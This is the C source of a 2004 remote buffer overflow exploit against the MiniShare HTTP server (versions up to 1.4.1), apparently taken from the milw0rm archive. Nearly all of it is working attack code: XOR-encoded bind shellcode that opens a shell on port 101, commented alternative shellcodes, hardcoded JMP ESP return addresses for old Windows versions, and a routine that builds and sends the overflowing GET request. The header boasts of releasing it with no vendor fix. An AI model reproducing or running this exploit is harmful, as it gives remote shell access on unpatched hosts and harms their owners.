/*



MiniShare <= 1.4.1, Remote Buffer Overflow Exploit v0.1.
Bind a shellcode to the port 101.

Full disclosure and exploit 
by class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
07 november 2004

Thanx to HDMoore and Metasploit.com for their kickass ASM work.


------------------
WHAT IS MINISHARE
------------------

Homepage - http://minishare.sourceforge.net/
	
	MiniShare is meant to serve anyone who has the need to share files to anyone,
	doesn't have a place to store the files on the web, 
    and does not want or simply does not have the skill
	and possibility to set up and maintain a complete HTTP-server software...

--------------
VULNERABILITY
--------------

	A simple buffer overflow in the link length, nothing more
	read the code for further instructions.

----
FIX
----

	Actually none, the vendor is contacted the same day published, 1 hour before you.
    As a nice fuck to NGSS , iDEFENSE and all others private disclosures
	homo crew ainsi que K-OTiK, ki se tap' des keu dans leur "Lab"
	lol :->

----
EXTRA
----
   
	Update the JMP ESP if you need. A wrong offset will crash minishare.
	Code tested working on MiniShare 1.4.1 and WinXP SP1 English, Win2k SP4 English, WinNT SP6 English
	Others MiniShare's versions aren't tested.
    Tip: If it crashes for you , try to play with Sleep()...

----
BY
----

    class101 [at] DFind.kd-team.com [&] #n3ws [at] EFnet
						 who
						greets
    DiabloHorn [at] www.kd-team.com [&] #kd-team [at] EFnet

*/




#include "winsock2.h"
#include "fstream.h"

#pragma comment(lib, "ws2_32")




//380 bytes, BIND shellcode port 101, XORed 0x88, thanx HDMoore. 

char scode[] =
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\x60\xDE\x88\x88\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D"
"\xF0\x89\x62\x03\xC2\x90\x03\xD2\xA8\x89\x63\x6B\xBA\xC1\x03\xBC\x03\x89\x66\xB9"
"\x77\x74\xB9\x48\x24\xB0\x68\xFC\x8F\x49\x47\x85\x89\x4F\x63\x7A\xB3\xF4\xAC\x9C"
"\xFD\x69\x03\xD2\xAC\x89\x63\xEE\x03\x84\xC3\x03\xD2\x94\x89\x63\x03\x8C\x03\x89"
"\x60\x63\x8A\xB9\x48\xD7\xD6\xD5\xD3\x4A\x80\x88\xD6\xE2\xB8\xD1\xEC\x03\x91\x03"
"\xD3\x84\x03\xD3\x94\x03\x93\x03\xD3\x80\xDB\xE0\x06\xC6\x86\x64\x77\x5E\x01\x4F"
"\x09\x64\x88\x89\x88\x88\xDF\xDE\xDB\x01\x6D\x60\xAF\x88\x88\x88\x18\x89\x88\x88"
"\x3E\x91\x90\x6F\x2C\x91\xF8\x61\x6D\xC1\x0E\xC1\x2C\x92\xF8\x4F\x2C\x25\xA6\x61"
"\x51\x81\x7D\x25\x43\x65\x74\xB3\xDF\xDB\xBA\xD7\xBB\xBA\x88\xD3\x05\xC3\xA8\xD9"
"\x77\x5F\x01\x57\x01\x4B\x05\xFD\x9C\xE2\x8F\xD1\xD9\xDB\x77\xBC\x07\x77\xDD\x8C"
"\xD1\x01\x8C\x06\x6A\x7A\xA3\xAF\xDC\x77\xBF\x77\xDD\xB8\xB9\x48\xD8\xD8\xD8\xD8"
"\xC8\xD8\xC8\xD8\x77\xDD\xA4\x01\x4F\xB9\x53\xDB\xDB\xE0\x8A\x88\x88\xED\x01\x68"
"\xE2\x98\xD8\xDF\x77\xDD\xAC\xDB\xDF\x77\xDD\xA0\xDB\xDC\xDF\x77\xDD\xA8\x01\x4F"
"\xE0\xCB\xC5\xCC\x88\x01\x6B\x0F\x72\xB9\x48\x05\xF4\xAC\x24\xE2\x9D\xD1\x7B\x23"
"\x0F\x72\x09\x64\xDC\x88\x88\x88\x4E\xCC\xAC\x98\xCC\xEE\x4F\xCC\xAC\xB4\x89\x89"
"\x01\xF4\xAC\xC0\x01\xF4\xAC\xC4\x01\xF4\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9"
"\xD9\xC9\xD9\xC1\xD9\xD9\xDB\xD9\x77\xFD\x88\xE0\xFA\x76\x3B\x9E\x77\xDD\x8C\x77"
"\x58\x01\x6E\x77\xFD\x88\xE0\x25\x51\x8D\x46\x77\xDD\x8C\x01\x4B\xE0\x77\x77\x77"
"\x77\x77\xBE\x77\x5B\x77\xFD\x88\xE0\xF6\x50\x6A\xFB\x77\xDD\x8C\xB9\x53\xDB\x77"
"\x58\x68\x61\x63\x6B\x90";

/*

//116 bytes, execute regedit.exe, XORed 0x88, hardcoded WinXP SP1 English

char scode+[] =
"\xEB"
"\x0F\x58\x80\x30\x88\x40\x81\x38\x68\x61\x63\x6B\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF"
"\xFF\xDD\x01\x6D\x09\x64\xC4\x88\x88\x88\xDB\x05\xF5\x3C\x4E\xCD\x7C\xFA\x4E\xCD"
"\x7D\xED\x4E\xCD\x7E\xEF\x4E\xCD\x7F\xED\x4E\xCD\x70\xEC\x4E\xCD\x71\xE1\x4E\xCD"
"\x72\xFC\x4E\xCD\x73\xA6\x4E\xCD\x74\xED\x4E\xCD\x75\xF0\x4E\xCD\x76\xED\x4E\xCD"
"\x77\x88\xE0\x8D\x88\x88\x88\x05\xCD\x7C\xD8\x30\xE8\x75\x6E\xFF\x77\x58\xE0\x89"
"\x88\x88\x88\x30\xEB\x10\x6F\xFF\x77\x58\x68\x61\x63\x6B\x90";

//565 bytes, execute regedit.exe, alphanumeric, hardcoded WinXP SP1 English

char scode+[]=
"LLLLYhbSgCX5bSgCHQVPPTQPPaRVVUSBRDJfh2ADTY09VQa0tkafhXMfXf1Dkbf1TkbjgY0Lkd0TkdfhH"
"CfYf1LkfjiY0Lkh0tkjjOX0Dkkf1TkljxY0Lko0Tko0TkqjfY0Lks0tks0Tkuj1Y0Lkw0tkw0tkyCjyY0"
"Lkz0TkzCC0tkzCCjmY0Lkz0TkzCC0TkzCCjhX0Dkz0tkzCC0tkzCCjPX0Dkz0TkzCC0tkzCCjfY0Lkz0T"
"kzCjjX0DkzC0TkzCCjeX0Dkz0tkzCC0TkzCCjvX0Dkz0tkzCC0TkzCCj3X0Dkz0tkzCC0tkzCCjOX0Dkz"
"0tkzCjaX0DkzCChuucTX1DkzCCCC0tkzCCjaY0Lkz0TkzCC0tkzCjRY0LkzCfhNUfXf1Dkzf1TkzCCCfh"
"hhfYf1Lkzf1TkzCCChS4ciX1DkzCCCC0TkzCC0tkzCjKY0Lkz0TkzCCfhzhfXf1Dkzf1TkzUvB3tLHCiS"
"r2K9Esr9Ele9E8g9Eqe9Ejd9Eni9EUt9EbD9Efe9Etx9E2e9EOahpucTrEjPG2LLwhGhR4ciGcgSwzG";

*/

static char payload[5000];

char espxp1en[]="\x33\x55\xdc\x77"; //JMP ESP - user32.dll   - WinXP SP1 English
char esp2k4en[]="\xb8\x9e\xe3\x77"; //JMP ESP - user32.dll   - Win2k SP4 English
char espnt6en[]="\xf8\x29\xf3\x77"; //JMP ESP - kernel32.dll - WinNT SP6 English

void usage(char* us);
WSADATA wsadata;
void ver();

int main(int argc,char *argv[])
{
	ver();
	if ((argc<3)||(argc>4)||(atoi(argv[1])<1)||(atoi(argv[1])>2)){usage(argv[0]);return -1;}
	if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){cout<<"[+] wsastartup error: "<<WSAGetLastError()<<endl;return -1;}
	int ip=htonl(inet_addr(argv[2])), sz, port, sizeA, sizeB, sizeC, a, b, c;
	char *target, *os;
	if (argc==4){port=atoi(argv[3]);}
	else port=80;
	if (atoi(argv[1]) == 1){target=espxp1en;os="WinXP SP1 English";}
	if (atoi(argv[1]) == 2){target=esp2k4en;os="Win2k SP4 English";}
	if (atoi(argv[1]) == 3){target=espnt6en;os="WinNT SP6 English";}
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET){ cout<<"[+] socket() error: "<<WSAGetLastError()<<endl;WSACleanup();return -1;}
	cout<<"[+] target: "<<os<<endl;			
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=htonl(ip);
	server.sin_port=htons(port);
	WSAConnect(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
	switch(select(s+1,NULL,&mask,NULL,&timeout))
	{
		case -1: {cout<<"[+] select() error: "<<WSAGetLastError()<<endl;closesocket(s);return -1;}
		case 0: {cout<<"[+] connection failed."<<endl;closesocket(s);return -1;}
		default:
		if(FD_ISSET(s,&mask))
		{
			cout<<"[+] connected, constructing the payload..."<<endl;
			Sleep(1000);
			sizeA=1787;
			sizeB=414-sizeof(scode);
			sizeC=10;
			sz=sizeA+sizeB+sizeC+sizeof(scode)+17;
			memset(payload,0,sizeof(payload));
			strcat(payload,"GET ");
			for (a=0;a<sizeA;a++){strcat(payload,"\x41");}
			strcat(payload,target);
			for (b=0;b<sizeB;b++){strcat(payload,"\x41");}
			strcat(payload,scode);
			for (c=0;c<sizeC;c++){strcat(payload,"\x41");}
			strcat(payload," HTTP/1.1\r\n\r\n");
			Sleep(1000);
		    if (send(s,payload,strlen(payload),0)==SOCKET_ERROR) { cout<<"[+] sending error, the server prolly rebooted."<<endl;return -1;}
			Sleep(1000);
			cout<<"[+] size of payload: "<<sz<<endl;			
			cout<<"[+] payload send, connect the port 101 to get a shell."<<endl;
			return 0;
		}
	}
	closesocket(s);
	WSACleanup();
	return 0;
}


void usage(char* us) 
{  
	cout<<"USAGE: 101_mini.exe Target Ip Port\n"<<endl;
	cout<<"TARGETS:                               "<<endl;
	cout<<"      [+] 1. WinXP SP1 English (*)"<<endl;
	cout<<"      [+] 2. Win2k SP4 English (*)"<<endl;
	cout<<"      [+] 3. WinNT SP6 English (*)"<<endl;
	cout<<"NOTE:                               "<<endl;
	cout<<"      The port 80 is default if no port specified"<<endl;
	cout<<"      The exploit bind a shellcode to the port 101"<<endl;
	cout<<"      A wildcard (*) mean Tested."<<endl;
	return;
} 

void ver()
{	
cout<<endl;
cout<<"                                                                   "<<endl;
cout<<"        ===================================================[v0.1]===="<<endl;
cout<<"        ====MiniShare, Minimal HTTP Server for Windows <= v1.4.1====="<<endl; 
cout<<"        =============Remote Buffer Overflow Exploit=================="<<endl;
cout<<"        ====coded by class101===========[DFind.kd-team.com 2004]====="<<endl;
cout<<"        ============================================================="<<endl;
cout<<"                                                                   "<<endl;
}

// milw0rm.com [2004-11-07]
